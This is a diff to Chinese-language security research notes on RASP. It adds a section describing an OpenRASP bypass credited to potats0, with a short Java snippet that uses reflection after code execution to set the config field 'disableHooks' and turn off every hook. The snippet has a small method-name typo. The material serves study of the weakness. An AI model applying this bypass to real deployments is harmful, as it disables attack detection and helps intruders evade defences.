@@ -1,3 +1,6 @@
+前置基础
+---
+
 **简介**
 
 Runtime Application Self-protection (RASP) is a security technology that is built or linked into an application or application runtime environment, and is capable of controlling application execution and detecting and preventing real-time attacks. 
@@ -95,5 +98,27 @@ public class LocalCommandHookHandler {
       return DEFAULT_HOOK_RESULT;
    }
 
+}
+```
+
+研究利用
+---
+
+### OpenRASP 代码执行 Bypass
+> by: potats0
+
+- 原因：安全机制在性能消耗上的让步
+- 实现：通过代码执行反射开启"禁用所用hook点"的feature
+
+```java
+try{
+   Class clazz = Class.forName("com.baidu.openrasp.config.Config");
+   Method m = clazz.getMethod("getConfig", null);
+   Object o = m.invoke(null, null);
+   Field disableHooksF = o.getClass().getDeclareField("disableHooks");
+   disableHooksF.setAccessible(true);
+   disableHooksF.set(o, true);
+}catch(Exception e){
+   e.printStackTrace();
 }
 ```
